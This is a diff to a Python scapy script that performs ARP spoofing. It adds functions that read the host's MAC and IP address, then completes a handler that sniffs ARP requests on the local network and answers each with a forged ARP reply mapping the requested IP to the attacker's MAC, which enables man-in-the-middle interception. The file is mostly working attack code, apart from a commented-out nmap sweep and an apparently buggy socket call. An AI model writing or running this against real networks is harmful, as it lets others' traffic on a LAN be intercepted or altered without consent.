@@ -1,20 +1,29 @@
 #!/usr/bin/env python3
 import os
+import socket
+from fcntl import ioctl
+import struct
 from scapy.all import *
 
 IP_MAC = []
+interface_name = "ens33"
 my_MAC = ""
+my_IP = ""
 
 def get_my_MAC():
-    global my_MAC
-    interface_name = "ens33"
+    global my_MAC, interface_name
     f = open('/sys/class/net/' + interface_name + '/address')
     my_MAC = f.read().strip()
-    print("my MAC: " + my_MAC)
+    print("my MAC:", my_MAC)
+def get_my_IP():
+    global my_IP, interface_name
+    s = socket.socket(socket.SOCK_DGRAM)
+    raw_ip = ioctl(s.fileno(), SIOCGIFADDR, struct.pack('64s', interface_name.encode("utf-8")))[20:24]
+    my_IP = socket.inet_ntoa(raw_ip)
+    print("my IP", my_IP)
 
 def sort_IP_MAC(entry):
     return entry[0]
-
 def collect_IP_MAC_info():
     global IP_MAC
     # os.system("nmap -sp 172.20.74.1-254")
@@ -41,13 +50,16 @@ def collect_IP_MAC_info():
 
 def ARP_spoofing(packet):
     # get ARP request
-    if ARP in packet and packet[ARP].op == ARP.who_has:
+    if ARP in packet and packet[ARP].op == 1:
         print(f"Received ARP request from {packet[ARP].psrc}")
-        arp = ARP(op=ARP.is_at, pdst=packet[ARP].psrc, hwdst=packet[ARP].hwsrc \
-                psrc=, hwsrc=)
+        ether = Ether(dst=packet[ARP].hwsrc, src=my_MAC)
+        arp = ARP(op=2, pdst=packet[ARP].psrc, hwdst=packet[ARP].hwsrc, \
+                  psrc=packet[ARP].pdst, hwsrc=my_MAC)
+        sendp(ether/arp)
     return
 
 get_my_MAC()
+get_my_IP()
 collect_IP_MAC_info()
 
 sniff(filter="arp", prn=ARP_spoofing, store=0)
